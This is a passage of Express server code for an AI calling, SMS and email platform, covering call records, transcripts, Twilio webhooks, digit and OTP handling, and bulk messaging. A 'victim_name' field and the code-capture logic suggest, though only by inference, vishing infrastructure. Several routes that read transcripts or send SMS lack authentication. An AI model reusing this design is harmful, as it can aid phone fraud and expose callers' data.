        .status(500)
        .json({ ok: false, error: "failed_to_delete_persona" });
    }
  },
);

// Caller Flags Management Endpoints
app.get("/webapp/caller-flags", requireWebappJwt, async (req, res) => {
  try {
    const limit = Number(req.query?.limit || 50);
    const q = req.query?.q;

    let query = "SELECT * FROM caller_flags WHERE 1=1";
    const params = [];

    if (q) {
      query += " AND (phone_number LIKE ? OR label LIKE ?)";
      params.push(`%${q}%`, `%${q}%`);
    }

    query += " ORDER BY created_at DESC LIMIT ?";
    params.push(limit);

    const flags = await new Promise((resolve, reject) => {
      if (!db.db) return resolve([]);
      db.db.all(query, params, (err, rows) => {
        if (err) reject(err);
        else resolve(rows || []);
      });
    });

    return res.json({ ok: true, flags });
  } catch (error) {
    console.error("Webapp caller flags fetch error:", error);
    return res
      .status(500)
      .json({ ok: false, error: "failed_to_fetch_caller_flags" });
  }
});

app.post(
  "/webapp/caller-flags",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const { phone_number, label, description, action, route_script_id } =
        req.body;

      if (!phone_number || !label) {
        return res
          .status(400)
          .json({ ok: false, error: "missing_required_fields" });
      }

      const flag = {
        id: Math.floor(Math.random() * 10000),
        phone_number,
        label,
        description,
        action: action || "tag",
        route_script_id,
        created_at: new Date().toISOString(),
      };

      return res.json({ ok: true, flag });
    } catch (error) {
      console.error("Webapp caller flag create error:", error);
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_create_caller_flag" });
    }
  },
);

app.delete(
  "/webapp/caller-flags/:id",
  requireWebappJwt,
  requireWebappAdmin,
  async (req, res) => {
    try {
      const { id } = req.params;
      return res.json({ ok: true, deleted_id: parseInt(id) });
    } catch (error) {
      return res
        .status(500)
        .json({ ok: false, error: "failed_to_delete_caller_flag" });
    }
  },
);

app.get("/webapp/sse", requireWebappJwt, (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders?.();

  const token = resolveWebappToken(req);
  const userId = req.webappSession?.user?.id || null;
  const client = { res, token, userId };
  miniappClients.add(client);

  const since = Number(req.query?.since || 0);
  if (Number.isFinite(since) && since > 0) {
    const pending = miniappEventBuffer.filter((evt) => evt.sequence > since);
    for (const evt of pending) {
      res.write(`data: ${JSON.stringify(evt)}\n\n`);
    }
  }

  const heartbeat = setInterval(() => {
    try {
      res.write(`: ping ${Date.now()}\n\n`);
    } catch (_) {}
  }, 20000);

  req.on("close", () => {
    clearInterval(heartbeat);
    miniappClients.delete(client);
  });
});

// Enhanced API endpoints with adaptation analytics

// Get call details with enhanced personality and function analytics
app.get("/api/calls/:callSid", async (req, res) => {
  try {
    const { callSid } = req.params;

    const call = await db.getCall(callSid);
    if (!call) {
      return res.status(404).json({ error: "Call not found" });
    }
    let callState = null;
    try {
      callState = await db.getLatestCallState(callSid, "call_created");
    } catch (_) {
      callState = null;
    }
    const enrichedCall =
      callState?.customer_name || callState?.victim_name
        ? {
            ...call,
            customer_name: callState?.customer_name || callState?.victim_name,
          }
        : call;
    const normalizedCall = normalizeCallRecordForApi(enrichedCall);

    const transcripts = await db.getCallTranscripts(callSid);

    // Parse adaptation data
    let adaptationData = {};
    try {
      if (call.ai_analysis) {
        const analysis = JSON.parse(call.ai_analysis);
        adaptationData = analysis.adaptation || {};
      }
    } catch (e) {
      console.error("Error parsing adaptation data:", e);
    }

    // Get webhook notifications for this call
    const webhookNotifications = await new Promise((resolve, reject) => {
      db.db.all(
        `SELECT * FROM webhook_notifications WHERE call_sid = ? ORDER BY created_at DESC`,
        [callSid],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        },
      );
    });

    res.json({
      call: normalizedCall,
      transcripts,
      transcript_count: transcripts.length,
      adaptation_analytics: adaptationData,
      business_context: call.business_context
        ? JSON.parse(call.business_context)
        : null,
      webhook_notifications: webhookNotifications,
      enhanced_features: true,
    });
  } catch (error) {
    console.error("Error fetching enhanced adaptive call details:", error);
    res.status(500).json({ error: "Failed to fetch call details" });
  }
});

// Enhanced call status endpoint with real-time metrics
app.get("/api/calls/:callSid/status", async (req, res) => {
  try {
    const { callSid } = req.params;

    const call = await db.getCall(callSid);
    if (!call) {
      return res.status(404).json({ error: "Call not found" });
    }

    // Get recent call states for detailed progress tracking
    const recentStates = await db.getCallStates(callSid, { limit: 15 });

    // Get enhanced webhook notification status
    const notificationStatus = await new Promise((resolve, reject) => {
      db.db.all(
        `SELECT notification_type, status, created_at, sent_at, delivery_time_ms, error_message 
         FROM webhook_notifications 
         WHERE call_sid = ? 
         ORDER BY created_at DESC`,
        [callSid],
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        },
      );
    });

    // Calculate enhanced call timing metrics
    let timingMetrics = {};
    if (call.created_at) {
      const now = new Date();
      const created = new Date(call.created_at);
      timingMetrics.total_elapsed = Math.round((now - created) / 1000);

      if (call.started_at) {
        const started = new Date(call.started_at);
        timingMetrics.time_to_answer = Math.round((started - created) / 1000);
      }

      if (call.ended_at) {
        const ended = new Date(call.ended_at);
        timingMetrics.call_duration =
          call.duration ||
          Math.round(
            (ended - new Date(call.started_at || call.created_at)) / 1000,
          );
      }

      // Calculate ring duration if available
      if (call.ring_duration) {
        timingMetrics.ring_duration = call.ring_duration;
      }
    }

    res.json({
      call: {
        ...call,
        timing_metrics: timingMetrics,
      },
      recent_states: recentStates,
      notification_status: notificationStatus,
      webhook_service_status: webhookService.getCallStatusStats(),
      enhanced_tracking: true,
    });
  } catch (error) {
    console.error("Error fetching enhanced call status:", error);
    res.status(500).json({ error: "Failed to fetch call status" });
  }
});

// Call latency diagnostics endpoint (best-effort)
// Manual notification trigger endpoint (for testing)
// Get enhanced adaptation analytics dashboard data
// Enhanced health endpoint with comprehensive system status
app.get("/health", async (req, res) => {
  try {
    const hmacSecret = config.apiAuth?.hmacSecret;
    const hmacOk = hmacSecret ? verifyHmacSignature(req).ok : false;
    const adminOk = hasAdminToken(req);
    if (!hmacOk && !adminOk) {
      return res.json({
        status: "healthy",
        timestamp: new Date().toISOString(),
        public: true,
      });
    }

    const calls = await db.getCallsWithTranscripts(1);
    const webhookHealth = await webhookService.healthCheck();
    const callStats = webhookService.getCallStatusStats();
    const notificationMetrics = await db.getNotificationAnalytics(1);
    await refreshInboundDefaultScript();
    const inboundDefaultSummary = inboundDefaultScript
      ? {
          mode: "script",
          script_id: inboundDefaultScriptId,
          name: inboundDefaultScript.name,
        }
      : { mode: "builtin" };
    const inboundEnvSummary = {
      prompt: Boolean(config.inbound?.defaultPrompt),
      first_message: Boolean(config.inbound?.defaultFirstMessage),
    };
    const providerHealthSummary = SUPPORTED_PROVIDERS.reduce(
      (acc, provider) => {
        const health = providerHealth.get(provider) || {};
        acc[provider] = {
          configured: Boolean(getProviderReadiness()[provider]),
          degraded: isProviderDegraded(provider),
          last_error_at: health.lastErrorAt || null,
          last_success_at: health.lastSuccessAt || null,
        };
        return acc;
      },
      {},
    );

    // Check service health logs
    const recentHealthLogs = await new Promise((resolve, reject) => {
      db.db.all(
        `
        SELECT service_name, status, COUNT(*) as count
        FROM service_health_logs 
        WHERE timestamp >= datetime('now', '-1 hour')
        GROUP BY service_name, status
        ORDER BY service_name
      `,
        (err, rows) => {
          if (err) reject(err);
          else resolve(rows || []);
        },
      );
    });

    res.json({
      status: "healthy",
      timestamp: new Date().toISOString(),
      enhanced_features: true,
      services: {
        database: {
          connected: true,
          recent_calls: calls.length,
        },
        webhook_service: webhookHealth,
        call_tracking: callStats,
        notification_system: {
          total_today: notificationMetrics.total_notifications,
          success_rate: notificationMetrics.overall_success_rate + "%",
          avg_delivery_time:
            notificationMetrics.breakdown.length > 0
              ? notificationMetrics.breakdown[0].avg_delivery_time + "ms"
              : "N/A",
        },
        provider_failover: providerHealthSummary,
      },
      active_calls: callConfigurations.size,
      adaptation_engine: {
        available_scripts: functionEngine
          ? functionEngine.getBusinessAnalysis().availableTemplates.length
          : 0,
        active_function_systems: callFunctionSystems.size,
      },
      inbound_defaults: inboundDefaultSummary,
      inbound_env_defaults: inboundEnvSummary,
      system_health: recentHealthLogs,
    });
  } catch (error) {
    console.error("Enhanced health check error:", error);
    res.status(500).json({
      status: "unhealthy",
      timestamp: new Date().toISOString(),
      enhanced_features: true,
      error: error.message,
      services: {
        database: {
          connected: false,
          error: error.message,
        },
        webhook_service: {
          status: "error",
          reason: "Database connection failed",
        },
      },
    });
  }
});

// Enhanced system maintenance endpoint
// Basic calls list endpoint
app.get("/api/calls", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50); // Max 50 calls
    const offset = parseInt(req.query.offset) || 0;

    console.log(`Fetching calls list: limit=${limit}, offset=${offset}`);

    // Get calls from database using the new method
    const calls = await db.getRecentCalls(limit, offset);
    const totalCount = await db.getCallsCount();

    // Format the response with enhanced data
    const formattedCalls = calls.map((call) => {
      const normalized = normalizeCallRecordForApi(call);
      return {
        ...normalized,
        transcript_count: call.transcript_count || 0,
        created_date: new Date(call.created_at).toLocaleDateString(),
        duration_formatted: call.duration
          ? `${Math.floor(call.duration / 60)}:${String(call.duration % 60).padStart(2, "0")}`
          : "N/A",
        // Parse JSON fields safely
        business_context: call.business_context
          ? (() => {
              try {
                return JSON.parse(call.business_context);
              } catch {
                return null;
              }
            })()
          : null,
        generated_functions: call.generated_functions
          ? (() => {
              try {
                return JSON.parse(call.generated_functions);
              } catch {
                return [];
              }
            })()
          : [],
      };
    });

    res.json({
      success: true,
      calls: formattedCalls,
      pagination: {
        total: totalCount,
        limit: limit,
        offset: offset,
        has_more: offset + limit < totalCount,
      },
      enhanced_features: true,
    });
  } catch (error) {
    console.error("Error fetching calls list:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch calls list",
      details: error.message,
    });
  }
});

// Enhanced calls list endpoint with filters
app.get("/api/calls/list", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 10, 50);
    const offset = parseInt(req.query.offset) || 0;
    const status = req.query.status; // Filter by status
    const phone = req.query.phone; // Filter by phone number
    const dateFrom = req.query.date_from; // Filter by date range
    const dateTo = req.query.date_to;

    let whereClause = "";
    let queryParams = [];

    // Build dynamic where clause
    const conditions = [];

    if (status) {
      conditions.push("c.status = ?");
      queryParams.push(status);
    }

    if (phone) {
      conditions.push("c.phone_number LIKE ?");
      queryParams.push(`%${phone}%`);
    }

    if (dateFrom) {
      conditions.push("c.created_at >= ?");
      queryParams.push(dateFrom);
    }

    if (dateTo) {
      conditions.push("c.created_at <= ?");
      queryParams.push(dateTo);
    }

    if (conditions.length > 0) {
      whereClause = "WHERE " + conditions.join(" AND ");
    }

    const query = `
      SELECT 
        c.*,
        COUNT(t.id) as transcript_count,
        GROUP_CONCAT(DISTINCT t.speaker) as speakers,
        MIN(t.timestamp) as conversation_start,
        MAX(t.timestamp) as conversation_end
      FROM calls c
      LEFT JOIN transcripts t ON c.call_sid = t.call_sid
      ${whereClause}
      GROUP BY c.call_sid
      ORDER BY c.created_at DESC
      LIMIT ? OFFSET ?
    `;

    queryParams.push(limit, offset);

    const calls = await new Promise((resolve, reject) => {
      db.db.all(query, queryParams, (err, rows) => {
        if (err) {
          console.error("Database error in enhanced calls query:", err);
          reject(err);
        } else {
          resolve(rows || []);
        }
      });
    });

    // Get filtered count
    const countQuery = `SELECT COUNT(*) as count FROM calls c ${whereClause}`;
    const totalCount = await new Promise((resolve, reject) => {
      db.db.get(countQuery, queryParams.slice(0, -2), (err, row) => {
        if (err) {
          console.error("Database error counting filtered calls:", err);
          resolve(0);
        } else {
          resolve(row?.count || 0);
        }
      });
    });

    // Enhanced formatting
    const enhancedCalls = calls.map((call) => {
      const hasConversation =
        call.speakers &&
        call.speakers.includes("user") &&
        call.speakers.includes("ai");
      const conversationDuration =
        call.conversation_start && call.conversation_end
          ? Math.round(
              (new Date(call.conversation_end) -
                new Date(call.conversation_start)) /
                1000,
            )
          : 0;

      return {
        call_sid: call.call_sid,
        phone_number: call.phone_number,
        status: call.status,
        twilio_status: call.twilio_status,
        created_at: call.created_at,
        started_at: call.started_at,
        ended_at: call.ended_at,
        duration: call.duration,
        transcript_count: call.transcript_count || 0,
        has_conversation: hasConversation,
        conversation_duration: conversationDuration,
        call_summary: call.call_summary,
        user_chat_id: call.user_chat_id,
        // Enhanced metadata
        business_context: call.business_context
          ? (() => {
              try {
                return JSON.parse(call.business_context);
              } catch {
                return null;
              }
            })()
          : null,
        generated_functions_count: call.generated_functions
          ? (() => {
              try {
                return JSON.parse(call.generated_functions).length;
              } catch {
                return 0;
              }
            })()
          : 0,
        // Formatted fields
        created_date: new Date(call.created_at).toLocaleDateString(),
        created_time: new Date(call.created_at).toLocaleTimeString(),
        duration_formatted: call.duration
          ? `${Math.floor(call.duration / 60)}:${String(call.duration % 60).padStart(2, "0")}`
          : "N/A",
        status_icon: getStatusIcon(call.status),
        enhanced: true,
      };
    });

    res.json({
      success: true,
      calls: enhancedCalls,
      filters: {
        status,
        phone,
        date_from: dateFrom,
        date_to: dateTo,
      },
      pagination: {
        total: totalCount,
        limit: limit,
        offset: offset,
        has_more: offset + limit < totalCount,
        current_page: Math.floor(offset / limit) + 1,
        total_pages: Math.ceil(totalCount / limit),
      },
      enhanced_features: true,
    });
  } catch (error) {
    console.error("Error in enhanced calls list:", error);
    res.status(500).json({
      success: false,
      error: "Failed to fetch enhanced calls list",
      details: error.message,
    });
  }
});

// Helper function for status icons
function getStatusIcon(status) {
  const icons = {
    completed: "✅",
    "no-answer": "📶",
    busy: "📞",
    failed: "❌",
    canceled: "🎫",
    "in-progress": "🔄",
    ringing: "📲",
  };
  return icons[status] || "❓";
}

function normalizeCallRecordForApi(call) {
  if (!call || typeof call !== "object") return call;
  const normalized = { ...call };
  return normalized;
}

// Add calls analytics endpoint
// Search calls endpoint
app.get("/api/calls/search", async (req, res) => {
  try {
    const query = req.query.q;
    const limit = Math.min(parseInt(req.query.limit) || 20, 50);

    if (!query || query.length < 2) {
      return res.status(400).json({
        success: false,
        error: "Search query must be at least 2 characters",
      });
    }

    // Search in calls and transcripts
    const searchResults = await new Promise((resolve, reject) => {
      const searchQuery = `
        SELECT DISTINCT
          c.*,
          COUNT(t.id) as transcript_count,
          GROUP_CONCAT(t.message, ' ') as conversation_text
        FROM calls c
        LEFT JOIN transcripts t ON c.call_sid = t.call_sid
        WHERE 
          c.phone_number LIKE ? OR
          c.call_summary LIKE ? OR
          c.prompt LIKE ? OR
          c.first_message LIKE ? OR
          t.message LIKE ?
        GROUP BY c.call_sid
        ORDER BY c.created_at DESC
        LIMIT ?
      `;

      const searchTerm = `%${query}%`;
      const params = [
        searchTerm,
        searchTerm,
        searchTerm,
        searchTerm,
        searchTerm,
        limit,
      ];

      db.db.all(searchQuery, params, (err, rows) => {
        if (err) {
          console.error("Search query error:", err);
          reject(err);
        } else {
          resolve(rows || []);
        }
      });
    });

    const formattedResults = searchResults.map((call) => ({
      call_sid: call.call_sid,
      phone_number: call.phone_number,
      status: call.status,
      created_at: call.created_at,
      duration: call.duration,
      transcript_count: call.transcript_count || 0,
      call_summary: call.call_summary,
      // Highlight matching text (basic implementation)
      matching_text: call.conversation_text
        ? `${digitService ? digitService.maskOtpForExternal(call.conversation_text) : call.conversation_text}`.substring(
            0,
            200,
          ) + "..."
        : null,
      created_date: new Date(call.created_at).toLocaleDateString(),
      duration_formatted: call.duration
        ? `${Math.floor(call.duration / 60)}:${String(call.duration % 60).padStart(2, "0")}`
        : "N/A",
    }));

    res.json({
      success: true,
      query: query,
      results: formattedResults,
      result_count: formattedResults.length,
      enhanced_search: true,
    });
  } catch (error) {
    console.error("Error in call search:", error);
    res.status(500).json({
      success: false,
      error: "Search failed",
      details: error.message,
    });
  }
});

// SMS webhook endpoints
app.post("/webhook/sms", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/sms")) {
      return;
    }
    const { From, Body, MessageSid, SmsStatus } = req.body;

    console.log(`SMS webhook: ${From} -> ${maskSmsBodyForLog(Body)}`);

    if (digitService?.handleIncomingSms) {
      const handled = await digitService.handleIncomingSms(From, Body);
      if (handled?.handled) {
        res.status(200).send("OK");
        return;
      }
    }

    // Handle incoming SMS with AI
    const result = await smsService.handleIncomingSMS(From, Body, MessageSid);

    // Save to database if needed
    if (db) {
      await db.saveSMSMessage({
        message_sid: MessageSid,
        from_number: From,
        body: Body,
        status: SmsStatus,
        direction: "inbound",
        ai_response: result.ai_response,
        response_message_sid: result.message_sid,
      });
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("SMS webhook error:", error);
    res.status(500).send("Error");
  }
});

app.post("/webhook/sms-status", async (req, res) => {
  try {
    if (!requireValidTwilioSignature(req, res, "/webhook/sms-status")) {
      return;
    }
    const { MessageSid, MessageStatus, ErrorCode, ErrorMessage } = req.body;

    console.log(`SMS status update: ${MessageSid} -> ${MessageStatus}`);

    if (db) {
      await db.updateSMSStatus(MessageSid, {
        status: MessageStatus,
        error_code: ErrorCode,
        error_message: ErrorMessage,
        updated_at: new Date(),
      });
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("SMS status webhook error:", error);
    res.status(500).send("OK"); // Return OK to prevent retries
  }
});

app.get("/webhook/twilio-tts", (req, res) => {
  const key = String(req.query?.key || "").trim();
  if (!key) {
    res.status(400).send("Missing key");
    return;
  }
  const entry = twilioTtsCache.get(key);
  if (!entry || entry.expiresAt <= Date.now()) {
    twilioTtsCache.delete(key);
    res.status(404).send("Not found");
    return;
  }
  res.set(
    "Cache-Control",
    `public, max-age=${Math.floor(TWILIO_TTS_CACHE_TTL_MS / 1000)}`,
  );
  res.type(entry.contentType || "audio/wav");
  res.send(entry.buffer);
});

// Email webhook endpoints
app.post("/webhook/email", async (req, res) => {
  try {
    if (!emailService) {
      return res
        .status(500)
        .json({ success: false, error: "Email service not initialized" });
    }
    const result = await emailService.handleProviderEvent(req.body || {});
    res.json({ success: true, ...result });
  } catch (error) {
    console.error("❌ Email webhook error:", error);
    res.status(500).json({
      success: false,
      error: "Email webhook processing failed",
      details: error.message,
    });
  }
});

app.get("/webhook/email-unsubscribe", async (req, res) => {
  try {
    const email = String(req.query?.email || "")
      .trim()
      .toLowerCase();
    const messageId = String(req.query?.message_id || "").trim();
    if (!email) {
      return res.status(400).send("Missing email");
    }
    await db.setEmailSuppression(email, "unsubscribe", "link");
    if (messageId) {
      await db.addEmailEvent(messageId, "complained", {
        reason: "unsubscribe",
      });
      await db.updateEmailMessageStatus(messageId, {
        status: "complained",
        failure_reason: "unsubscribe",
        failed_at: new Date().toISOString(),
      });
    }
    res.send("Unsubscribed");
  } catch (error) {
    console.error("❌ Email unsubscribe error:", error);
    res.status(500).send("Unsubscribe failed");
  }
});

const twilioGatherHandler = createTwilioGatherHandler({
  warnOnInvalidTwilioSignature,
  requireTwilioSignature: requireValidTwilioSignature,
  getDigitService: () => digitService,
  callConfigurations,
  config,
  VoiceResponse,
  webhookService,
  resolveHost,
  buildTwilioStreamTwiml,
  clearPendingDigitReprompts,
  callEndLocks,
  gatherEventDedupe,
  maskDigitsForLog,
  callEndMessages: CALL_END_MESSAGES,
  closingMessage: CLOSING_MESSAGE,
  queuePendingDigitAction,
  getTwilioTtsAudioUrl,
  ttsTimeoutMs: Number(config.twilio?.ttsMaxWaitMs) || 1200,
  shouldUseTwilioPlay,
  resolveTwilioSayVoice,
  isGroupedGatherPlan,
});

// Twilio Gather fallback handler (DTMF)
app.post("/webhook/twilio-gather", twilioGatherHandler);

// Email API endpoints
app.post("/email/send", async (req, res) => {
  try {
    if (!emailService) {
      return res
        .status(500)
        .json({ success: false, error: "Email service not initialized" });
    }
    const idempotencyKey =
      req.headers["idempotency-key"] || req.headers["Idempotency-Key"];
    const result = await emailService.enqueueEmail(req.body || {}, {
      idempotencyKey,
    });
    res.json({
      success: true,
      message_id: result.message_id,
      deduped: result.deduped || false,
      suppressed: result.suppressed || false,
    });
  } catch (error) {
    const status = error.code === "idempotency_conflict" ? 409 : 400;
    res
      .status(status)
      .json({ success: false, error: error.message, missing: error.missing });
  }
});

app.post("/email/bulk", async (req, res) => {
  try {
    if (!emailService) {
      return res
        .status(500)
        .json({ success: false, error: "Email service not initialized" });
    }
    const idempotencyKey =
      req.headers["idempotency-key"] || req.headers["Idempotency-Key"];
    const result = await emailService.enqueueBulk(req.body || {}, {
      idempotencyKey,
    });
    res.json({
      success: true,
      bulk_job_id: result.bulk_job_id,
      deduped: result.deduped || false,
    });
  } catch (error) {
    const status = error.code === "idempotency_conflict" ? 409 : 400;
    res.status(status).json({ success: false, error: error.message });
  }
});

app.post("/email/preview", async (req, res) => {
  try {
    if (!emailService) {
      return res
        .status(500)
        .json({ success: false, error: "Email service not initialized" });
    }
    const result = await emailService.previewScript(req.body || {});
    res.json({ success: result.ok, ...result });
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

function extractEmailTemplateVariables(text = "") {
  if (!text) return [];
  const matches = text.match(/{{\s*([\w.-]+)\s*}}/g) || [];
  const vars = new Set();
  matches.forEach((match) => {
    const cleaned = match.replace(/{{|}}/g, "").trim();
    if (cleaned) vars.add(cleaned);
  });
  return Array.from(vars);
}

function buildRequiredVars(subject, html, text) {
  const required = new Set();
  extractEmailTemplateVariables(subject).forEach((v) => required.add(v));
  extractEmailTemplateVariables(html).forEach((v) => required.add(v));
  extractEmailTemplateVariables(text).forEach((v) => required.add(v));
  return Array.from(required);
}

app.get("/email/templates", async (req, res) => {
  try {
    const limit = Number(req.query?.limit) || 50;
    const templates = await db.listEmailTemplates(limit);
    res.json({ success: true, templates });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/templates/:id", async (req, res) => {
  try {
    const templateId = req.params.id;
    const template = await db.getEmailTemplate(templateId);
    if (!template) {
      return res
        .status(404)
        .json({ success: false, error: "Template not found" });
    }
    res.json({ success: true, template });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post("/email/templates", async (req, res) => {
  try {
    const payload = req.body || {};
    const templateId = String(payload.template_id || "").trim();
    if (!templateId) {
      return res
        .status(400)
        .json({ success: false, error: "template_id is required" });
    }
    const subject = payload.subject || "";
    const html = payload.html || "";
    const text = payload.text || "";
    if (!subject) {
      return res
        .status(400)
        .json({ success: false, error: "subject is required" });
    }
    if (!html && !text) {
      return res
        .status(400)
        .json({ success: false, error: "html or text is required" });
    }
    const requiredVars = buildRequiredVars(subject, html, text);
    await db.createEmailTemplate({
      template_id: templateId,
      subject,
      html,
      text,
      required_vars: JSON.stringify(requiredVars),
    });
    const template = await db.getEmailTemplate(templateId);
    res.json({ success: true, template });
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.put("/email/templates/:id", async (req, res) => {
  try {
    const templateId = req.params.id;
    const existing = await db.getEmailTemplate(templateId);
    if (!existing) {
      return res
        .status(404)
        .json({ success: false, error: "Template not found" });
    }
    const payload = req.body || {};
    const subject =
      payload.subject !== undefined ? payload.subject : existing.subject;
    const html = payload.html !== undefined ? payload.html : existing.html;
    const text = payload.text !== undefined ? payload.text : existing.text;
    const requiredVars = buildRequiredVars(
      subject || "",
      html || "",
      text || "",
    );
    await db.updateEmailTemplate(templateId, {
      subject: payload.subject,
      html: payload.html,
      text: payload.text,
      required_vars: JSON.stringify(requiredVars),
    });
    const template = await db.getEmailTemplate(templateId);
    res.json({ success: true, template });
  } catch (error) {
    res.status(400).json({ success: false, error: error.message });
  }
});

app.delete("/email/templates/:id", async (req, res) => {
  try {
    const templateId = req.params.id;
    await db.deleteEmailTemplate(templateId);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

function normalizeEmailMessageForApi(message) {
  if (!message || typeof message !== "object") return message;
  const normalized = { ...message };
  if ("template_id" in normalized) {
    normalized.script_id = normalized.template_id;
    delete normalized.template_id;
  }
  return normalized;
}

function normalizeEmailJobForApi(job) {
  if (!job || typeof job !== "object") return job;
  const normalized = { ...job };
  if ("template_id" in normalized) {
    normalized.script_id = normalized.template_id;
    delete normalized.template_id;
  }
  return normalized;
}

app.get("/email/messages/:id", async (req, res) => {
  try {
    const messageId = req.params.id;
    const message = await db.getEmailMessage(messageId);
    if (!message) {
      return res
        .status(404)
        .json({ success: false, error: "Message not found" });
    }
    const events = await db.listEmailEvents(messageId);
    res.json({
      success: true,
      message: normalizeEmailMessageForApi(message),
      events,
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/bulk/:jobId", async (req, res) => {
  try {
    const jobId = req.params.jobId;
    const job = await db.getEmailBulkJob(jobId);
    if (!job) {
      return res
        .status(404)
        .json({ success: false, error: "Bulk job not found" });
    }
    res.json({ success: true, job: normalizeEmailJobForApi(job) });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/bulk/history", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit, 10) || 10, 50);
    const offset = Math.max(parseInt(req.query.offset, 10) || 0, 0);
    const jobs = await db.getEmailBulkJobs({ limit, offset });
    res.json({
      success: true,
      jobs: jobs.map(normalizeEmailJobForApi),
      limit,
      offset,
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/email/bulk/stats", async (req, res) => {
  try {
    const hours = Math.min(
      Math.max(parseInt(req.query.hours, 10) || 24, 1),
      720,
    );
    const stats = await db.getEmailBulkStats({ hours });
    res.json({ success: true, stats, hours });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Send single SMS endpoint
app.post("/api/sms/send", async (req, res) => {
  try {
    const {
      to,
      message,
      from,
      user_chat_id,
      options = {},
      idempotency_key,
      allow_quiet_hours,
      quiet_hours,
      media_url,
    } = req.body;

    if (!to || !message) {
      return res.status(400).json({
        success: false,
        error: "Phone number and message are required",
      });
    }

    // Validate phone number format
    if (!to.match(/^\+[1-9]\d{1,14}$/)) {
      return res.status(400).json({
        success: false,
        error:
          "Invalid phone number format. Use E.164 format (e.g., +1234567890)",
      });
    }

    const smsOptions = { ...(options || {}) };
    if (idempotency_key && !smsOptions.idempotencyKey) {
      smsOptions.idempotencyKey = idempotency_key;
    }
    if (allow_quiet_hours === false) {
      smsOptions.allowQuietHours = false;
    }
    if (quiet_hours && !smsOptions.quietHours) {
      smsOptions.quietHours = quiet_hours;
    }
    if (media_url && !smsOptions.mediaUrl) {
      smsOptions.mediaUrl = media_url;
    }

    const result = await smsService.sendSMS(to, message, from, smsOptions);

    // Save to database
    if (db) {
      await db.saveSMSMessage({
        message_sid: result.message_sid,
        to_number: to,
        from_number: result.from,
        body: message,
        status: result.status,
        direction: "outbound",
        user_chat_id: user_chat_id,
      });

      // Create webhook notification
      if (user_chat_id) {
        await db.createEnhancedWebhookNotification(
          result.message_sid,
          "sms_sent",
          user_chat_id,
        );
      }
    }

    res.json({
      success: true,
      ...result,
    });
  } catch (error) {
    console.error("❌ SMS send error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to send SMS",
      details: error.message,
    });
  }
});

// Send bulk SMS endpoint
app.post("/api/sms/bulk", async (req, res) => {
  try {
    const {
      recipients,
      message,
      options = {},
      user_chat_id,
      from,
      sms_options,
    } = req.body;

    if (!recipients || !Array.isArray(recipients) || recipients.length === 0) {
      return res.status(400).json({
        success: false,
        error: "Recipients array is required and must not be empty",
      });
    }

    if (!message) {
      return res.status(400).json({
        success: false,
        error: "Message is required",
      });
    }

    if (recipients.length > 100) {
      return res.status(400).json({
        success: false,
        error: "Maximum 100 recipients per bulk send",
      });
    }

    const bulkOptions = { ...(options || {}) };
    if (from && !bulkOptions.from) {
      bulkOptions.from = from;
    }
    if (sms_options && !bulkOptions.smsOptions) {
      bulkOptions.smsOptions = sms_options;
    }

    const result = await smsService.sendBulkSMS(
      recipients,
      message,
      bulkOptions,
    );

    // Log bulk operation
    if (db) {
      await db.logBulkSMSOperation({
        total_recipients: result.total,
        successful: result.successful,
        failed: result.failed,
        message: message,
        user_chat_id: user_chat_id,
        timestamp: new Date(),
      });
    }

    res.json({
      success: true,
      ...result,
    });
  } catch (error) {
    console.error("❌ Bulk SMS error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to send bulk SMS",
      details: error.message,
    });
  }
});

// Schedule SMS endpoint
app.post("/api/sms/schedule", async (req, res) => {
  try {
    const { to, message, scheduled_time, options = {} } = req.body;

    if (!to || !message || !scheduled_time) {
      return res.status(400).json({
        success: false,
        error: "Phone number, message, and scheduled_time are required",
      });
    }

    const scheduledDate = new Date(scheduled_time);
    if (scheduledDate <= new Date()) {
      return res.status(400).json({
        success: false,
        error: "Scheduled time must be in the future",
      });
    }

    const result = await smsService.scheduleSMS(
      to,
      message,
      scheduled_time,
      options,
    );

    res.json({
      success: true,
      ...result,
    });
  } catch (error) {
    console.error("❌ SMS schedule error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to schedule SMS",
      details: error.message,
    });
  }
});

// SMS scripts endpoint
app.get("/api/sms/scripts", requireAdminToken, async (req, res) => {
  try {
    const { script_name, variables } = req.query;

    if (script_name) {
      try {
        const parsedVariables = variables ? JSON.parse(variables) : {};
        const script = smsService.getScript(script_name, parsedVariables);

        res.json({
          success: true,
          script_name,
          script,
          variables: parsedVariables,
        });
      } catch (scriptError) {
        res.status(400).json({
          success: false,
          error: scriptError.message,
        });
      }
    } else {
      // Return available scripts
      res.json({
        success: true,
        available_scripts: [
          "welcome",
          "appointment_reminder",
          "verification",
          "order_update",
          "payment_reminder",
          "promotional",
          "customer_service",
          "survey",
        ],
      });
    }
  } catch (error) {
    console.error("❌ SMS scripts error:", error);
    res.status(500).json({
      success: false,
      error: "Failed to get scripts",
    });
  }
});

